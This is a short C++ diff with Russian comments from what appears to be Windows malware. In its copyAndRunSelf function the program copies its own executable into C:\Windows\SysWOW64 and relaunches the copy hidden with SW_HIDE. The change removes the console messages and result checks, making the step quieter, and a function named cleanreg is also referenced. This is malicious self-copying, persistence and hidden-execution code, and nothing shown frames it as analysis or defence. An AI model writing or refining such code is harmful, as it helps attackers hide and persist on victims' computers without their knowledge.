@@ -135,18 +135,9 @@ bool copyAndRunSelf() {
     if (strstr(path, targetDirectory) != NULL) {
         return 0;
     }
-
-    
-    // Копируем файл
-    if (CopyFile(path, destination, FALSE)) {
-        std::cout << "Файл успешно скопирован в C:\\Windows\\SysWOW64." << std::endl;
-    }
-
-    // Запускаем свою копию
-    if (ShellExecute(NULL, "open", destination, NULL, NULL, SW_HIDE)) {
-        std::cout << "Успешно запущена копия программы." << std::endl;
-        return 1;
-    }
+    // копируем и запусскаем
+    CopyFile(path, destination, FALSE);
+    ShellExecute(NULL, "open", destination, NULL, NULL, SW_HIDE);
     return 1;
 }
 void cleanreg() {
